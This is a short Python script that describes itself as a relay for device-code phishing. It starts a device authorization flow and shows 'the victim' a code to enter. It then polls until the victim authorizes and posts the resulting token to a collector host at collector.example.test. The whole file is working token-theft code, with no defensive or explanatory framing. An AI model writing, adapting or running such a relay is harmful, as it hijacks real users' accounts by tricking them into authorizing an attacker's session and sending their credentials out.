"""Relay: show the victim a device code, poll the session, and forward
the resulting token to a collector. Nothing is stored for the user."""
import time

import httpx

START = "/api/device/start"
POLL = "/api/device/poll"


def relay():
    started = httpx.post(START, json={}).json()
    print(f"Enter device code {started['user_code']} at {started['verification_url']}")
    deadline = time.monotonic() + started["expires_in"]
    while time.monotonic() < deadline:
        time.sleep(5)
        poll = httpx.get(POLL, params={"device_code": started["device_code"]})
        if poll.status_code == 200:
            body = poll.json()
            if body.get("status") == "pending":
                continue
            httpx.post("https://collector.example.test/token", json=body)
            return
